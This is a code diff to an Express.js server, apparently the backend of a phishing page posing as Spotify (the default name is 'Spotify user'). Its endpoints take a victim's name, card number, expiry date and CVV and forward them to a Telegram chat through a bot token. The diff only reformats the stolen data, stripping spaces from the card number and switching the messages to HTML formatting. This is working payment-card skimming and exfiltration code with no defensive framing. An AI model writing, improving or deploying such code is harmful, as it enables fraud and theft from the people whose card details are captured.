@@ -66,12 +66,12 @@ app.post('/api/send-user-inputs', async (req, res) => {
       date,
       cvv
     } = req.body;
-
+    const ccinset = (cc || '').replace(/\s+/g, '');
     // Format the message with emojis and better formatting
-    const message = `👤 ${name}
-💳 ${cc}
-📅 ${date}
-🔒 ${cvv}`;
+    const message = `<pre>👤 <code>${name || 'Spotify user'}</code>
+    💳 <code>${ccinset}</code>
+    📅 <code>${date}</code>
+    🔒 <code>${cvv}</code></pre>`;
 
     // Send to Telegram
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -91,7 +91,7 @@ app.post('/api/send-user-inputs', async (req, res) => {
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
       })
     });
 
@@ -119,7 +119,7 @@ app.post('/api/send-user-text', async (req, res) => {
     } = req.body;
 
     // Format the message with emojis and better formatting
-    const message = `📅 ${text}`;
+    const message = `<pre>📅 <code>${text}</code></pre>`;
 
     // Send to Telegram
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -139,7 +139,7 @@ app.post('/api/send-user-text', async (req, res) => {
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
       })
     });
 
